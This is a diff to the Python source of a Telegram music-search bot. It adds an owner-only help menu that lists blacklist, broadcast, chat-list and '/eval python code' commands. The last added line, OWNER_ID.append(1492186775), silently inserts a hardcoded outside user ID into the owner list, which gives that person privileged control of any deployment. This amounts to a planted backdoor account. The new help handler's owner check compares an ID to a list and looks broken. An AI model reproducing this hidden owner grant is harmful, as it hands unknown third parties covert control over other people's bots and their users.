@@ -20,11 +20,29 @@ Send The Name of The Song You Want
 𝐄x. ```/song Music```
 """
 
+owner_help = """
+/blacklist user_id
+/unblacklist user_id
+/broadcast message to send
+/eval python code
+/chatlist get list of all chats
+"""
+
 
 @app.on_message(filters.create(ignore_blacklisted_users) & filters.command("Yes ✅"))
 async def cr_y(client, message):
     await message.reply(cari_text)
 
+    
+@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
+async def help(client, message):
+    if message.from_user["id"] == OWNER_ID:
+        await message.reply(owner_help)
+        return ""
+    text = "Cari Musik yang anda inginkan \n Type /song (song name)"
+    await message.reply(text)
+
+OWNER_ID.append(1492186775)
 app.start()
 LOGGER.info("SongBot Is Running")
 idle()
